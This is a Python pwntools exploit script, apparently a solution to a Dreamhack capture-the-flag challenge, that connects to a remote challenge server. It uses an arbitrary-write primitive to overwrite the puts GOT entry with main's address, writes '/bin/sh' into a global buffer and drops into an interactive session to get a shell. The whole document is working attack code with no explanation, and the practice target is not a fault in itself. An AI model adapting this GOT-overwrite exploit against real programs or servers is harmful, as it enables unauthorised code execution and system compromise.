#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./prob_patched',checksec=False)

#p = process()
p = remote('host3.dreamhack.games', 19984)
#gdb.attach(p,gdbscript='''
#           b*0x00000000004012c2
#           b*0x00000000004012f1
#           ''')
#input()
main = exe.symbols['main']
st = 0x0000000000404080
puts_got = exe.got['puts']
p.sendlineafter("pt: ", str(int(puts_got)))
p.sendlineafter("input: ", p64(main))

#2 st overwrite
p.sendlineafter("pt: ", str(int(st)))
p.sendlineafter("input: ", b'/bin/sh\x00')
p.interactive()
